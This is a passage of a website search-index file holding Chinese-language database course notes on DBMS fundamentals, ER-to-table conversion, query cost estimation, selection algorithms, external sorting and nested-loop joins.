\u5c5e\u4e8e Many-to-One Relation</li> <li>\u53ef\u4ee5\u5408\u5e76\u4e3a\uff1a<code>account(account_number, branch_name, balance)</code></li> <li>\u591a\u5bf9\u4e00\u5173\u7cfb\u4e2d\uff0c\u5173\u7cfb\u5bf9\u5e94\u7684 Table \u7684 Primary Key \u4e00\u822c\u53ea\u4e3a\u201c\u591a\u201d\u7684\u4e00\u65b9\u7684 Primary Key\uff0c\u8fd9\u4e5f\u662f\u5b83\u4eec\u53ef\u4ee5\u5408\u5e76\u7684\u57fa\u7840</li> </ul> </li> <li>\u5bf9\u4e8e One-to-One\uff0c\u5219\u53ef\u4ee5\u4efb\u610f\u9009\u53d6\u4e00\u8fb9\u5408\u5e76</li> <li>Many-to-Many \u4e0d\u80fd\u5c06\u5173\u7cfb\u5bf9\u5e94\u7684 Table \u5408\u5e76\uff0c\u6216\u8005\u8bf4\u5408\u5e76\u4e86\u4e5f\u6ca1\u6709\u610f\u4e49</li> </ul> <p>\u5173\u7cfb\u5bf9\u5e94\u7684 Table \u9664\u4e86\u5305\u542b\u4e24\u8fb9\u7684 Primary Key \u5916\uff0c\u8fd8\u53ef\u4ee5\u5b58\u50a8\u4e00\u4e9b\u989d\u5916\u7684 Decriptive Message</p>"},{"location":"Courses/DB/Introduction/","title":"Introduction","text":""},{"location":"Courses/DB/Introduction/#lecture-1-introduction","title":"Lecture 1. Introduction","text":"<p> \u7ea6 1023 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DB/Introduction/#definition","title":"Definition","text":"<ul> <li>&lt;1&gt; Database is a very large, integrated collection of data</li> <li>&lt;2&gt; A DBMS is a software system designed to store, manage and facilitate access to databases</li> </ul> <p>\u6362\u4e00\u79cd\u8868\u8ff0</p> <p>Datebase Management System(DBMS) = (Database) + A set of programs used to access, update and manage the data in database</p> <p>\u4f20\u7edf OS \u63d0\u4f9b\u7684 File-Processing System \u4e0d\u80fd\u5f88\u597d\u5730\u7ef4\u62a4 data files \u7684\u683c\u5f0f\uff0c\u5e76\u4e14 data files \u4e4b\u95f4\u7684\u5173\u8054\u6027\u5f88\u4f4e\u3002</p> \u5177\u4f53\u800c\u8a00\u5b58\u5728\u4ee5\u4e0b\u95ee\u9898 <ul> <li>(1) Data redundancy and inconsistency<ul> <li>Multiple file formats, duplication of information in different files</li> </ul> </li> <li>(2) Difficulty in accessing data<ul> <li>Need to write a new program to carry out each new task</li> </ul> </li> <li>(3) Data isolation \u2014 multiple files and multiple formats<ul> <li>Difficult to retrieve, difficult to share</li> </ul> </li> <li>(4)Integrity problems<ul> <li>Integrity constraints\u00a0 (e.g. account balance &gt; 0) become part of program code, so that it's hard to add new constraints or change existing ones</li> </ul> </li> <li>(5) No atomicity of updates</li> <li>(6) Difficult to concurrent access by multiple users</li> <li>(7) Security problems (i.e., Right person uses right data)</li> </ul> <p>\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u4e0d\u540c\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684 Datebase Management System \u6765\u89e3\u51b3\u4ee5\u4e0a\u95ee\u9898\u3002</p> <p>\u5bf9\u4e8e DB\uff0c\u6211\u4eec\u5c06\u5176\u62bd\u8c61\u4e3a 3-level\uff0c\u4e0d\u540c\u7684\u5c42\u6709\u4e0d\u540c\u7684\u7528\u9014\uff1a</p> <p></p> <ul> <li>Physical Level: how a record is stored<ul> <li>\u5728\u7269\u7406\u5b58\u50a8\u4ecb\u8d28\u4e2d\u5982\u4f55\u4fdd\u5b58\u3001\u5b9e\u73b0</li> </ul> </li> <li>Logical Level: describes data stored in database, and the relationships among the data on upper level<ul> <li>\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u4ec0\u4e48\u6570\u636e\uff1f\u6570\u636e\u4e4b\u95f4\u6709\u4ec0\u4e48\u5173\u7cfb\uff1f</li> </ul> </li> <li>View Level: application programs hide details of data types<ul> <li>\u6839\u636e\u9700\u6c42\u5c55\u73b0\u7ed9\u4e0d\u540c\u7528\u6237\u7684\u6570\u636e\u89c6\u56fe</li> </ul> </li> </ul> <p>A very brief example:</p> <p></p> <ul> <li>Schema - the structure of the database on different level<ul> <li>Physical schema: database structure design at the physical level</li> <li>Logical schema: database structure design at the logical level</li> <li>Subschema: schema at view level</li> </ul> </li> <li>Instance - the actual content of the database at a particular point in time</li> </ul> <p>\u901a\u4fd7\u6765\u8bb2\uff0c\u53ef\u4ee5\u8ba4\u4e3a Schema \u662f\u8868\u7684 Column\uff0cInstance \u4e3a\u8868\u7684 Row(\u53ca\u5176\u5185\u5bb9)\uff0c\u4e8c\u8005\u7ed3\u5408\u5728\u4e00\u8d77\u624d\u662f Relation\u3002</p> <p>Independence \u6307\u7684\u662f\u4fee\u6539\u67d0\u4e00\u5c42\u7684 Schema \u5b9a\u4e49\uff0c\u800c\u4e0d\u5f71\u54cd\u9ad8\u5c42\u7684 Schema \u7684\u80fd\u529b\u3002\u4f8b\u5982\uff0cPhysical Data Independence \u4e3a\u4fee\u6539 Physical Schema \u5e76\u4e14\u4e0d\u9700\u8981\u66f4\u6539 Logical Schema \u7684 \u80fd\u529b\u3002</p> <p>DBMS \u505a\u5230 Independence \u7684\u8981\u70b9\u4e3a\u53ea\u4fee\u6539\u4e24\u5c42\u4e4b\u95f4\u7684\u6620\u5c04\uff0c\u800c\u4e0d\u4fee\u6539\u5b9e\u9645 Schema</p>"},{"location":"Courses/DB/Introduction/#data-models","title":"Data Models","text":"<p>\u4e0d\u540c level \u7684 data abstraction \u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684 data model \u53bb\u63cf\u8ff0\uff0c\u5e38\u89c1\u7684 data model \u6709\uff1a</p> <ul> <li>Entity-Relationship Model<ul> <li>\u901a\u5e38\u7528\u4e8e\u6570\u636e\u5e93\u7684 Conceptual Design</li> </ul> </li> <li>Relational Model<ul> <li>\u901a\u5e38\u7528\u4e8e\u6570\u636e\u5e93\u7684 Logical Design</li> </ul> </li> <li>Other Models<ul> <li>Object-Oriented Model</li> <li>Semi-structured Data Model</li> <li>Older Models such as network model, hierarchy model, etc</li> </ul> </li> </ul> <p>\u672c\u8bfe\u7a0b\u4e3b\u8981\u6d89\u53ca\u7684\u6570\u636e\u5e93\u5efa\u7acb\u5728\u5173\u7cfb\u578b\u6a21\u578b\u7684\u57fa\u7840\u4e0a\uff0c\u5b83\u6709\u5982\u4e0b\u4e09\u70b9\u5173\u952e\uff1a</p> <ul> <li>Store database in simple data structures (relations).</li> <li>Access data through high-level language, DBMS figures out best execution strategy.</li> <li>Physical storage left up to the DBMS implementation.</li> </ul> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e Ralational Model \u8bbe\u8ba1\u7684\u4e09\u4e2a\u91cd\u8981\u6982\u5ff5\u5728\u4e8e\uff1a</p> <ul> <li>&lt;1&gt; Structure: The defination of the database's relations and their contents</li> <li>&lt;2&gt; Intergrity: Ensure the database's contents satisfy constraints</li> <li>&lt;3&gt; Manipulation: Programming interface for accessing and modifying a database's contents</li> </ul>"},{"location":"Courses/DB/Introduction/#database-language","title":"Database Language","text":"<ul> <li>Data Definition Language, DDL: \u6307\u5b9a\u4e86\u6570\u636e\u5e93\u7684 Schema\uff0c\u4ea7\u751f\u7684 metadata \u4f1a\u5b58\u653e\u5728 data dictionary \u4e2d</li> <li>Data Manipulation Language, DML: \u4ece\u6570\u636e\u5e93\u5b58\u53d6\u6570\u636e\u7684\u8bed\u8a00\uff0c\u5373\u4e0e DB \u4ea4\u4e92\u7684\u65b9\u5f0f\uff0c\u4e5f\u88ab\u79f0\u4e3a Query Language\uff0c\u5b83\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b<ul> <li>Procedural Method:\u00a0\u5bf9\u6570\u636e\u5e93\u7684\u8bf7\u6c42\u4e13\u6ce8\u4e8e\u66f4\u9ad8\u5c42\u6b21\u4e0a\u5bf9\u5982\u4f55\u67e5\u8be2\u60f3\u8981\u7ed3\u679c\u7684\u7b56\u7565<ul> <li>Relational Algebra, C, Java \u7b49\uff0c\u6570\u636e\u5e93\u5fc5\u987b\u7531\u8fc7\u7a0b\u5f0f\u8bed\u8a00\u7f16\u5199</li> </ul> </li> <li>Non-Procedural (Declarative):\u00a0\u5bf9\u6570\u636e\u5e93\u7684\u8bf7\u6c42\u53ea\u6307\u51fa\u6211\u4eec\u60f3\u8981\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u600e\u4e48\u53bb\u627e\u5230\u5b83<ul> <li>Relational Calculus, SQL \u672c\u8eab\u4e5f\u5c5e\u4e8e\u8fd9\u4e00\u7c7b</li> </ul> </li> </ul> </li> <li>Data Control Language, DCL: \u7528\u6765\u63a7\u5236\u6570\u636e\u7684\u6743\u9650</li> </ul> <p>SQL \u662f\u6700\u5e7f\u6cdb\u4f7f\u7528\u7684 Query Language\uff1b\u6709\u4e9b DBMS \u4e3a SQL \u63d0\u4f9b\u4e86 Procedural Extensions</p> <p>SQL = DDL + DML + DCL</p>"},{"location":"Courses/DB/Introduction/#users-administrators","title":"Users &amp; Administrators","text":"<p>\u6839\u636e\u7528\u6237\u4e0d\u540c\u7684\u4ea4\u4e92\u9700\u6c42\uff0c\u53ef\u4ee5\u5c06\u4ed6\u4eec\u5206\u4e3a Naive Users\u3001Sophisticated users\u3001Specialized users\u3001Application programmers \u7b49\uff1a</p> <p></p> <p>Database Administrator(DBA) \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u7528\u6237\uff0c\u4ed6\u62e5\u6709\u6570\u636e\u5e93\u7684\u6240\u6709\u6743\u9650\uff0c\u5305\u62ec\u7ec4\u6210 DBMS \u7684 Programs\u3002DBA \u8981\u505a\u5b9a\u4e49\u6a21\u5f0f\uff0c\u6570\u636e\u5e93\u8c03\u8c10\uff0c\u6545\u969c\u65f6\u6062\u590d\uff08\u5907\u4efd\uff09\u7b49\u5de5\u4f5c\u3002</p>"},{"location":"Courses/DB/Introduction/#database-architecture","title":"Database Architecture","text":"<p>Query Processor</p> <p>Query Processor \u5305\u62ec DDL interpreter\uff0cDML compiler \u4ee5\u53ca query processing\u3002\u5b83\u5c06\u4e00\u4e2a SQL \u67e5\u8be2\u5206\u5272\u7ffb\u8bd1\u4e3a Relation-Algebra\uff0c\u518d\u7531 Optimzer \u4f18\u5316\u7ec4\u7ec7\u6210 Execution Plan\uff0c\u6700\u540e\u5728\u4f4e\u5c42\u6b21\u4e0a\u6267\u884c\u8f93\u51fa\uff1a</p> <p></p> <p>Storage Manager</p> <p>Storage Manager \u5305\u62ec Transaction Manager\u3001Authorization and Integrity Manager\u3001File Manager \u4ee5\u53ca Buffer Manager\uff0c\u5b83\u662f\u5185\u5b58\u548c\u78c1\u76d8\u4e4b\u95f4\u7684\u63a5\u53e3\u3002</p> <p>\u5177\u4f53\u5b9e\u73b0\u4ee5\u540e\u5e94\u8be5\u4f1a\u8bb2\uff08\u6216\u8005\u4f60\u505a\u4e86 <code>minisql</code> \u5e94\u8be5\u77e5\u9053\uff09\u3002</p> <p>\u6267\u884c\u4e00\u6761 SQL \u8bed\u53e5\u7684\u6d41\u7a0b</p> <p></p>"},{"location":"Courses/DB/Query%20Processing/","title":"Query Processing","text":""},{"location":"Courses/DB/Query%20Processing/#query-processing","title":"Query Processing","text":"<p> \u7ea6 3859 \u4e2a\u5b57  20 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 20 \u5206\u949f</p> <p>Parsing &amp; Translation =&gt; Optimization =&gt; Evaluation</p> <p></p>"},{"location":"Courses/DB/Query%20Processing/#query-cost","title":"Query Cost","text":"<p>Cost \u901a\u5e38\u901a\u8fc7\u65f6\u95f4\u6765\u8861\u91cf\uff0c\u53d7\u5230\u5f88\u591a\u56e0\u7d20\u5f71\u54cd\uff1a</p> <ul> <li>Disk Access</li> <li>CPU<ul> <li>\u672c\u8bfe\u7a0b\u4e0d\u8003\u8651\uff0c\u4f46\u968f\u7740\u5185\u5b58\u8ba1\u7b97\u548c CPU \u5bc6\u96c6\u578b\u64cd\u4f5c\u7684\u589e\u591a\uff0cCPU \u4ee3\u4ef7\u5728\u73b0\u4ee3\u7cfb\u7edf\u4e2d\u4e5f\u8d8a\u53d1\u91cd\u8981</li> </ul> </li> <li>Network Communication<ul> <li>\u5728\u5206\u5e03\u5f0f\u4e2d\u53d7\u5230\u5f71\u54cd</li> </ul> </li> </ul> <p>Disk Access \u901a\u5e38\u662f Query Cost \u7684\u4e3b\u8981\u6027\u80fd\u74f6\u9888\uff0c\u5e76\u4e14\u76f8\u5bf9\u66f4\u5bb9\u6613\u4f30\u8ba1\uff1a</p> \\[ b*t_T + S*t_S \\] <ul> <li>\\(t_T\\) \uff1atime to transfer one block<ul> <li>\u6570\u636e\u4f20\u8f93\u65f6\u95f4</li> <li>e.g. 0.1 ms</li> </ul> </li> <li>\\(t_S\\) \uff1atime for one seek<ul> <li>\u8bfb\u5199\u5934\u5bfb\u5740\u65f6\u95f4</li> <li>e.g. 4 ms</li> </ul> </li> </ul> <p>\u6211\u4eec\u5c06 \\(t_T, t_S\\) \u90fd\u770b\u4f5c\u5e38\u91cf\uff0c\u5b9e\u9645\u7684\u4f30\u8ba1\u53ea\u4e0e \\(b\\) \u548c \\(S\\) \u6709\u5173\u3002</p> <p>\u672c Cost Model \u4e2d\u4e5f\u6ca1\u6709\u8003\u8651\u5c06\u6700\u7ec8\u7ed3\u679c\u5199\u56de\u78c1\u76d8\u9700\u8981\u7684\u65f6\u95f4</p> <p>\u7531\u4e8e\u78c1\u76d8\u7684 IO \u6b21\u6570\u4f9d\u8d56\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u7ed9\u6570\u636e\u5e93\u7684 Buffer \u5927\u5c0f\uff0c\u800c\u8fd9\u4e00\u5927\u5c0f\u53c8\u662f\u8fd0\u884c\u65f6\u52a8\u6001\u5206\u914d\u7684\uff0c\u6211\u4eec\u96be\u4ee5\u786e\u5b9a\u4e00\u4e2a\u6267\u884c\u65f6\u7684\u786e\u5207\u503c\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4f30\u8ba1\u65f6\u901a\u5e38\u4ee5 Worst Case \u548c Best Case \u4e24\u4e2a\u65b9\u9762\u4f30\u8ba1\u3002</p>"},{"location":"Courses/DB/Query%20Processing/#select","title":"SELECT","text":"<p>File Scan</p> <p>File Scan \u7684\u7b97\u6cd5\u5728\u4e0d\u4f7f\u7528 Index \u7684\u6761\u4ef6\u4e0b\u8fdb\u884c\u641c\u7d22\u3002</p> <p>\u3010Algorithm 1\u3011 Linear Search</p> <ul> <li>\u626b\u63cf\u6bcf\u4e2a Block\uff0c\u68c0\u67e5 Records \u662f\u5426\u6ee1\u8db3 Selection Condition</li> <li>Cost Estimate: cost = \\(b_r\\) transfers + 1 seek</li> <li>\u5982\u679c\u67e5\u8be2\u6761\u4ef6\u662f key attribute \u7684\u7279\u5b9a\u503c\uff0c\u5219\u5e73\u5747\u67e5\u627e\u4e00\u534a Blocks \u5c31\u80fd\u505c\u6b62\uff0c\u6b64\u65f6\uff1a<ul> <li>cost = \\(b_r / 2\\) transfers + 1 seek</li> </ul> </li> </ul> <p>\u3010Algorithm 2\u3011 Binary Search</p> <ul> <li>\u4ec5\u67e5\u627e File \u6392\u5e8f\u4f9d\u636e\u7684\u5c5e\u6027\u65f6\u53ef\u7528\uff0c\u8981\u6c42 Blocks \u8fde\u7eed</li> <li>Cost Estimate: cost = \\(\\lceil \\log_2 b_r\\rceil\\) transfers + \\(\\lceil \\log_2 b_r \\rceil\\) seeks<ul> <li>\u627e\u5230\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684 tuple \u7684 cost\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u4e0d\u662f Key Attribute\uff0c\u5219\u8981\u4e58\u4ee5\u5305\u542b\u6ee1\u8db3\u67e5\u8be2\u6761\u4ef6\u7684 Records \u7684 Block \u7684\u4e2a\u6570</li> </ul> </li> <li>\u4e8c\u5206\u67e5\u627e\u5728\u666e\u901a\u6587\u4ef6\u4e0a\u610f\u4e49\u4e0d\u5927\uff0c\u4e14\u9700\u8981\u66f4\u591a\u7684\u5bfb\u9053\u6b21\u6570\uff0c\u901a\u5e38\u4e0d\u5982\u7d22\u5f15\u641c\u7d22</li> </ul> <p>Index Scan &amp; Equality</p> <p>Index Scan \u7684\u7b97\u6cd5\u7684 Selection Condition \u5fc5\u987b\u662f index \u7684 search-key\u3002</p> <p>\u3010Algorithm 3\u3011 Primary Key &amp; Equality On Key</p> <ul> <li>\u53ea\u9700\u8981\u627e\u5230\u4e00\u4e2a record\uff0c\u56e0\u6b64\u4e0e\u7d22\u5f15 B+ Tree \u7684\u9ad8\u5ea6 \\(h_i\\) \u6709\u5173</li> <li>Cost Estimate: cost = \\((h_i +1) *(t_T +t_S)\\)</li> </ul> <p>\u3010Algorithm 4\u3011 Primary Key &amp; Equality On NonKey</p> <ul> <li>\u4e0e A3 \u7684\u533a\u522b\u5728\u4e8e\u53ef\u80fd\u6709\u5f88\u591a records \u7b26\u5408\u6761\u4ef6\uff0c\u4f46\u662f\u5b83\u4eec\u4ecd\u5728\u8fde\u7eed\u7684 Blocks \u4e2d</li> <li>Cost Estimate: cost = \\(h_i *(t_T +t_S) +t_S +t_T*b\\)<ul> <li>\\(b\\) \u4e3a\u5305\u542b\u7b26\u5408\u6761\u4ef6 Records \u7684 Block \u4e2a\u6570\uff0c\u7ea6\u7b49\u4e8e \\(\\lceil sc(A,r)/f_r\\rceil\\)</li> <li>\u5982\u679c B+ \u6811\u7d22\u5f15\u53f6\u8282\u70b9\u5b58\u50a8\u4e86\u6574\u4e2a Tuple\uff0c\u5219\u53ef\u4ee5\u8282\u7701\u6700\u540e\u4e00\u6b21 Seek \u65f6\u95f4</li> </ul> </li> </ul> <p>\u3010Algorithm 5\u3011 Secondary Key &amp; Equality On NonKey</p> <ul> <li>\u5982\u679c Search-Key \u662f Candidate Key\uff0c\u5219\u4e3a\u5355\u4e2a Record<ul> <li>Cost Estimate: cost = \\((h_i +1)*(t_T+ t_S)\\)</li> </ul> </li> <li>\u5982\u679c Search-Key \u975e Candidate Key\uff0c\u5219\u4e3a\u5206\u5e03\u5728\u4e0d\u8fde\u7eed Blocks \u4e0a\u7684 \\(n\\) \u4e2a Records<ul> <li>Cost Estimate: cost = \\((h_i +n)*(t_T+ t_S)\\)</li> <li>\u6027\u80fd\u6709\u53ef\u80fd\u5f31\u4e8e Linear Search !!!</li> </ul> </li> </ul> <p>Comparisons</p> <p>\\(\\sigma_{A\\le V} (r)\\), \\(\\sigma_{A\\ge V}(r)\\) \u7b49\u6bd4\u8f83 Selection\uff0c\u53ef\u4ee5\u91c7\u7528\uff1a</p> <ul> <li>&lt;1&gt; Linear Search</li> <li>&lt;2&gt; Binary Search</li> <li>&lt;3&gt; \u4f7f\u7528\u4e0b\u9762\u7684 Indices \u65b9\u6cd5</li> </ul> <p>\u3010Algorithm 6\u3011 Primary Key &amp; Comparisons</p> <ul> <li>\u5bf9\u4e8e \\(\\sigma_{A\\ge V} (r)\\)\uff0c\u4f7f\u7528\u7d22\u5f15\u627e\u5230\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684 Records\uff0c\u968f\u540e\u4ece\u8be5\u4f4d\u7f6e\u5f00\u59cb\u987a\u5e8f\u626b\u63cf\u3002\u6b64\u65f6\u540c A4<ul> <li>Cost Estimate: cost = \\(h_i *(t_T +t_S) +t_S +t_T*b\\)</li> </ul> </li> <li>\u5bf9\u4e8e \\(\\sigma_{A\\le V} (r)\\)\uff0c\u4ece\u7b2c\u4e00\u4e2a Records \u5f00\u59cb\u987a\u5e8f\u626b\u63cf\uff0c\u4e0d\u4f7f\u7528\u7d22\u5f15<ul> <li>\u8003\u8bd5\u4f3c\u4e4e\u4e0d\u8003\u8651\u8fd9\u79cd\u60c5\u51b5</li> </ul> </li> </ul> <p>\u3010Algorithm 7\u3011 Secondary Key &amp; Comparisons</p> <ul> <li>\u5bf9\u4e8e \\(\\sigma_{A\\ge V} (r)\\)\uff0c\u4f7f\u7528\u7d22\u5f15\u627e\u5230\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684 Index Entry\uff0c\u7136\u540e\u987a\u5e8f\u626b\u63cf Index\uff0c\u53d6\u51fa\u5bf9\u5e94\u6307\u9488\uff0c\u6b64\u65f6\u540c A5<ul> <li>Cost Estimate: cost = \\((h_i +n)*(t_T+ t_S)\\)</li> </ul> </li> <li>\u5bf9\u4e8e \\(\\sigma_{A\\le V} (r)\\)\uff0c\u4ece\u7b2c\u4e00\u4e2a\u53f6\u8282\u70b9\u5f00\u59cb\u987a\u5e8f\u626b\u63cf\u53d6\u51fa\u6307\u9488</li> <li>\u8fd9\u79cd\u60c5\u51b5\u4e0b Linear Search \u6709\u53ef\u80fd\u66f4\u4f18</li> </ul> <p>Conjunction &amp; Disjunction</p> <p>Conjunction\uff1a\\(\\sigma_{\\theta _1\\land \\theta_2 \\land...\\land \\theta_n}(r)\\)</p> <p>\u3010Algorithm 8\u3011 Conjunction &amp; One Index</p> <ul> <li>\u8bd5\u8fd0\u884c\u6761\u4ef6 \\(\\theta_i\\)\uff0c\u4ece\u4e2d\u9009\u53d6 Cost \u6700\u5c0f\u7684\u5148\u6267\u884c\uff1b\u4e0b\u4e00\u6b65\u518d\u5bf9\u8be5\u7ed3\u679c\u6267\u884c\u522b\u7684 \\(\\theta\\)</li> </ul> <p>\u3010Algorithm 9\u3011 Conjunction &amp; Composite Index</p> <ul> <li>\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u4f7f\u7528\u5408\u9002\u7684 Composite Index(Multi-Key)</li> </ul> <p>\u3010Algorithm 10\u3011 Conjunction &amp; Intersection</p> <ul> <li>\u5bf9\u4e8e\u5404\u4e2a \\(\\theta\\)\uff0c\u83b7\u53d6\u5230\u5bf9\u5e94 Index \u96c6\uff0c\u7136\u540e\u53d6\u4ea4\u96c6\uff0c\u6700\u540e\u6839\u636e\u6307\u9488\u4ece File \u4e2d Fetch Records</li> <li>\u5982\u679c\u4e00\u4e9b\u6761\u4ef6\u4e0d\u5b58\u5728\u5408\u9002\u7684 Index\uff0c\u5219\u653e\u8fdb Memory \u4e2d\u8fdb\u884c\u6d4b\u8bd5</li> <li>\u8981\u6c42 Index \u4e2d\u5b58\u653e\u4e86\u6307\u5411\u5bf9\u5e94 Records \u7684\u6307\u9488</li> </ul> <p>Disjunction\uff1a\\(\\sigma_{\\theta _1\\lor \\theta_2 \\lor...\\lor \\theta_n}(r)\\)</p> <p>\u3010Algorithm 11\u3011 Disjunction &amp; Union</p> <ul> <li>\u5bf9\u4e8e\u5404\u4e2a \\(\\theta\\)\uff0c\u83b7\u53d6\u5230\u5bf9\u5e94 Index \u96c6\uff0c\u7136\u540e\u53d6\u5e76\u96c6\uff0c\u6700\u540e\u6839\u636e\u6307\u9488\u4ece File \u4e2d Fetch Records</li> <li>\u8981\u6c42\u6240\u6709\u6761\u4ef6\u90fd\u5b58\u5728\u76f8\u5e94\u53ef\u7528\u7684 Index\uff0c\u5426\u5219\u91c7\u7528 Linear Search</li> </ul>"},{"location":"Courses/DB/Query%20Processing/#sorting","title":"Sorting *","text":"<p>\u4e3a\u4ec0\u4e48\u8981 Sorting\uff1f</p> <ul> <li>&lt;1&gt; \u8f93\u51fa\u8981\u6c42</li> <li>&lt;2&gt; \u4f7f <code>JOIN</code> \u64cd\u4f5c\u6267\u884c\u66f4\u5feb</li> </ul> <p>\u5982\u679c\u5f85\u6392\u5e8f\u6570\u636e\u80fd\u591f\u5168\u653e\u8fdb Memory\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u5feb\u901f\u6392\u5e8f\u7b49\u7b97\u6cd5\uff1b\u5982\u679c\u4e0d\u80fd\uff0c\u5219\u4f7f\u7528\u5916\u90e8\u5f52\u5e76\u6392\u5e8f\u3002</p> <p>\u5bf9\u4e8e \\(M\\) \u5927\u5c0f\u7684\u5185\u5b58\u3001\\(b_r\\) \u4e2a\u5f85\u6392\u5e8f Block\uff1a</p> <ul> <li>Total Number of runs: \\(\\lceil b_r / M \\rceil\\)</li> <li>Total Number of merge passes required: \\(\\lceil \\log_{M-1} (b_r  / M) \\rceil\\)</li> <li>Total Number of Transfer: \\(b_r (2 \\lceil \\log_{M-1} (b_r  / M) \\rceil +1)\\)</li> <li>Total Number of Seeks: \\(2\\lceil b_r / M \\rceil + b_r ( 2 \\lceil \\log_{M-1} (b_r  / M) \\rceil -1)\\)</li> </ul>"},{"location":"Courses/DB/Query%20Processing/#join","title":"JOIN","text":"<p>\\(r\\bowtie s\\)</p> <ul> <li>Nested-Loop Join</li> <li>Block Nested-Loop Join<ul> <li>\u4ee5 Block \u4e3a\u5355\u4f4d\u7684\u5d4c\u5957\u94fe\u63a5</li> </ul> </li> <li>Indexed Nested-Loop Join</li> <li>Merge-Join</li> <li>Hash-Join</li> </ul> <p>Nested-Loop Join</p> <p>\u8ba1\u7b97 \\(r \\bowtie_\\theta s\\) \u7684\u6b65\u9aa4\u4e3a\uff1a</p> <pre><code>for each tuple t_r in r do begin\n    for each tuple t_s in s do begin\n        test pair (t_r, t_s) if they satisfy the join condition\n        if they do, add t_r * t_s to result\n    end\nend\n</code></pre> <p>\u5916\u5c42\u6bcf\u9009\u62e9\u4e00\u4e2a Record\uff0c\u5185\u5c42\u904d\u5386\u6574\u4e2a File\u3002\u904d\u5386\u6574\u4e2a\u5185\u5c42 File \u53ea\u7528\u4e00\u6b21 Seek\u3002</p> <ul> <li>\u5728\u6700\u574f\u60c5\u51b5\uff0c\u5373 Memory \u4e2d Buffer \u53ea\u80fd\u521a\u597d\u653e\u4e0b\u5404\u4e2a Relation \u7684\u4e00\u4e2a Block<ul> <li>Block Transfers: \\(n_r *b_s + b_r\\)</li> <li>Seeks: \\(n_r + b_r\\)</li> </ul> </li> <li>\u5728\u6700\u597d\u60c5\u51b5\uff0c\u5373\u6240\u6709\u6570\u636e\u90fd\u80fd\u653e\u5165 Memory \u4e2d<ul> <li>Block Transfers: \\(b_s +b_r\\)</li> <li>Seeks: \\(2\\)</li> </ul> </li> </ul> <p>Blocked Nested-Loop Join</p> <pre><code>for each block B_r of r do begin\n    for each block B_s of s do begin\n        for each tuple t_r in B_r do begin\n            for each tuple t_s in B_s do begin\n                test pair (t_r, t_s) if they satisfy the join condition\n                if they do, add t_r * t_s to result\n            end\n        end\n    end\nend\n</code></pre> <p>\u5916\u5c42\u5148\u53d6\u4e00\u4e2a Block\uff0c\u5185\u5c42\u4e5f\u53d6\u4e00\u4e2a Block\uff0c\u7136\u540e\u518d\u5728\u5916\u5c42\u53d6\u7684 Block \u4e2d\u9009\u53d6\u4e00\u4e2a Record\uff0c\u904d\u5386\u5185\u5c42\u53d6\u7684 Block \u4e2d\u7684 Record\u3002\u8fd9\u6837\u5916\u5c42\u5728\u66f4\u6362 Record \u65f6\u4e0d\u9700\u8981\u91cd\u65b0 Seek\u3002\u8fd9\u91cc\u8981\u6c42\u5185\u5b58\u8d77\u7801\u80fd\u653e\u5f97\u4e0b 3 \u4e2a Block\u3002</p> <ul> <li>Worst Case<ul> <li>Block Transfers: \\(b_r *b_s +b_r\\)</li> <li>Seeks: \\(2b_r\\)</li> </ul> </li> <li>Best Case<ul> <li>Block Transfers: \\(b_r +b_s\\)</li> <li>Seeks: \\(2\\)</li> </ul> </li> <li>Common Case\uff08Memory \u4e2d\u53ef\u4ee5\u653e\u5f97\u4e0b \\(M\\) \u4e2a Blocks\uff09<ul> <li>Block Transfers: \\(\\lceil b_r / (M-2)\\rceil *b_s + b_r\\)</li> <li>Seeks: \\(2\\lceil b_r / (M-2) \\rceil\\)</li> </ul> </li> </ul> <p>\u5bf9\u4e8e LRU \u7b56\u7565\u7684 Buffer\uff0c\u626b\u63cf\u5185\u5c42\u5faa\u73af\u65f6\u53ef\u4ee5\u9009\u62e9\u524d\u540e\u4ea4\u66ff\u8fdb\u884c\uff0c\u4ee5\u4f7f Blocks \u7559\u5728 Buffer \u4e2d</p> <p>\u5373\u7b2c N \u8f6e\u626b\u63cf\u5185\u5c42\u4ece\u524d\u5f80\u540e\uff0c\u7b2c N+1 \u8f6e\u626b\u63cf\u5185\u5c42\u4ece\u540e\u5f80\u524d\u3002</p> <p>Indexed Nested-Loop Join</p> <p>\u5728 <code>JOIN</code> \u64cd\u4f5c\u662f\u4e00\u4e2a\u7b49\u4e8e\u6761\u4ef6\uff08\u5305\u62ec\u81ea\u7136\u8fde\u63a5\uff09\u5e76\u4e14 Inner Relation \u7684 Join Attribute \u5b58\u5728\u53ef\u7528\u7684 Index \u7684\u6761\u4ef6\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528 Index Lookup \u4ee3\u66ff File Scan\u3002</p> <p>\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u4e5f\u53ef\u4ee5\u5f53\u573a\u6392\u5e8f\u6784\u9020\u4e00\u4e2a Index</p> <p>\u8be5\u7b97\u6cd5\u6d41\u7a0b\u590d\u6742\u591a\u53d8\uff0c\u56e0\u6b64\u53ea\u80fd\u7c97\u7565\u7ed9\u51fa\u4e00\u4e2a\u4f30\u8ba1\uff1a</p> \\[\\ b_r( t_T +t_S) + n_r *c \\] <p>\u5176\u4e2d \\(c\\) \u6307\u5bf9\u5185\u5c42\u8868 \\(s\\) \u5355\u6b21\u7d22\u5f15\u67e5\u8be2\u7684\u5e73\u5747\u5f00\u9500\u3002</p> <p>\u5982\u679c \\(r\\) \u548c \\(s\\) 